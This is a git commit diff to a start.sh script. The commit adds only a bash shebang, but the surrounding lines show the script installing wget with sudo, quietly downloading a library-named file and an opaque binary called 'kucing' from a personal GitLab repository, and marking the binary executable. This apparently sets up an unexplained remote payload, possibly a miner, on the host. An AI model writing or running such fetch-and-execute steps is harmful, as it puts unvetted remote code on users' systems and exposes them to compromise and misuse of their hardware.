fff5a198fb3ae1540242eeefa164ac8a1e72d4f1
anihsugiarti9 <137507644+anihsugiarti9@users.noreply.github.com>
2023-12-05 20:07:06 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,3 +1,4 @@
+#!/bin/bash
 sudo apt install wget
 wget -qO libnvrtc.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc.so.12.0.76
 wget -qO kucing https://gitlab.com/sarifadim/jomblo/-/raw/main/kucing && chmod +x kucing
